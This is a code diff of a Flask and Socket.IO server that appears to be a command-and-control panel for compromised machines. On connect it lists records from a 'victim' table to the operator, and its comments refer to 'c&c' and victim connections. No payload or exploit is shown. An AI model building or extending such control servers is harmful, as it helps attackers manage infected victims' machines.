@@ -1,7 +1,7 @@
 import re
 from sqlite3.dbapi2 import Error
 from flask import Flask, json, jsonify, render_template, url_for, request, redirect, session, make_response
-from flask_socketio import SocketIO, emit
+from flask_socketio import SocketIO, emit, join_room, rooms
 from passlib.hash import pbkdf2_sha256
 import sqlite3
 import uuid
@@ -42,9 +42,22 @@ commands = [
 
 @socketio.on('connect')
 def test_connect():
+    # take note of where connnection is coming from
     with open('server_soc_id.txt', 'w') as f:
         f.write(request.sid)
     emit('after connect',  {'data':'Session starting ...'})
+    try:
+        con = sqlite3.connect("database.db")
+        cur = con.cursor()
+        cur.execute("SELECT * FROM victim")
+        record = cur.fetchall()
+        con.close()
+        if record.__len__() != 0:
+            emit("victims", record)
+        else:
+            emit("victims", "None")
+    except sqlite3.Error as error:
+        print("something went wrong")
 
 
 @socketio.on('Slider value changed')
@@ -65,22 +78,7 @@ def value_changed(message):
 #         # do something
 
 
-# @socketio.on
-# def connect():
-#   # get socket id an write to txt
-#     try:
-#         con = sqlite3.connect("database.db")
-#         cur = con.cursor()
-#         cur.execute("SELECT * FROM victim WHERE client-id= ?", (id,))
-#         record = cur.fetchall()
-#         con.close()
-#         # emit to c&c id
-#         if record.__len__() != 0:
-#             emit("victims", record)
-#         else:
-#             emit("victims", None)
-#     except sqlite3.Error as error:
-#         # do something
+
 
 # @socketio.on("victim_connect")
 # def victim_connect(details):
@@ -125,7 +123,7 @@ def index():
     if 'username' not in session:
         return redirect("/login", code=302)
     else:
-        return render_template("index.html"), 200
+        return render_template("index.html", username=session['username']), 200
 
 
 @app.route("/login", methods=['GET', 'POST'])
